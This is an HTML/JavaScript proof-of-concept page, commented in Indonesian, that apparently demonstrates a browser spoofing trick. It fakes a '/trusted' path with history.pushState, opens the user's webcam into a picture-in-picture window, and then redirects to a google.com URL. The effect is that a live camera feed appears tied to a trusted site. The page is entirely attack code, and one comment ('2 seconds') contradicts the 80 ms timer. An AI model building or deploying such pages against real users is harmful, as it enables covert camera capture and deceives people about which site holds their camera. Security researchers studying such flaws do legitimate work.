<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Camera PoC with PiP</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin:0;
  font-family:-apple-system,BlinkMacSystemFont,system-ui;
  background:#f5f5f7;
}

button {
  margin:6px;
  font-size:14px;
  padding:8px 12px;
}

#panel {
  display:none;
  max-width:520px;
  margin:60px auto;
  background:#fff;
  padding:24px;
  border-radius:16px;
  box-shadow:0 20px 60px rgba(0,0,0,.2);
}

h2 { text-align:center; margin-bottom:6px; }
.sub { text-align:center; color:#666; margin-bottom:20px; }

.notice {
  margin-top:14px;
  font-size:13px;
  color:#b00020;
}

video { 
  width:100%; 
  margin-top:10px; 
}
</style>
</head>

<body>

<div style="text-align:center">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>Access Camera</h2>

  <button id="cameraButton" onclick="openCamera()">Open Camera</button>
  <video id="camera" autoplay playsinline></video>

  <button id="pipButton" onclick="togglePiP()">Toggle PiP</button>

  <div class="notice">
    Demo only — browser permission required
  </div>
</div>

<script>
const panel = document.getElementById('panel');
const trigger = document.getElementById('trigger');
const camera = document.getElementById('camera');
const pipButton = document.getElementById('pipButton');

// Fungsi untuk membuka kamera
function openCamera() {
  checkCameraPermission()
    .then(hasPermission => {
      if (hasPermission) {
        navigator.mediaDevices.getUserMedia({ video:true })
          .then(stream => {
            camera.srcObject = stream;
            camera.style.display = "block";
          })
          .catch(() => alert('Camera denied'));
      } else {
        alert('Camera permission denied by user');
      }
    });
}

// Cek izin kamera dengan navigator.permissions
function checkCameraPermission() {
  return navigator.permissions.query({ name: 'camera' })
    .then(permissionStatus => {
      return permissionStatus.state === 'granted';
    })
    .catch(() => {
      return false; // Jika tidak dapat mengecek izin, anggap ditolak
    });
}

// Fungsi untuk mengaktifkan atau menonaktifkan PiP
function togglePiP() {
  if (document.pictureInPictureElement) {
    document.exitPictureInPicture()
      .catch(err => alert('Error exiting PiP: ' + err));
  } else if (camera.requestPictureInPicture) {
    camera.requestPictureInPicture()
      .catch(err => alert('Error entering PiP: ' + err));
  }
}

trigger.onclick = () => {
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';
};

// Mengarah ke Google setelah beberapa detik
window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'https://google.com:8000'; // Redirect ke Google
      }, 80); // 2 detik setelah klik tombol
    });
  });
});
</script>

</body>
</html>
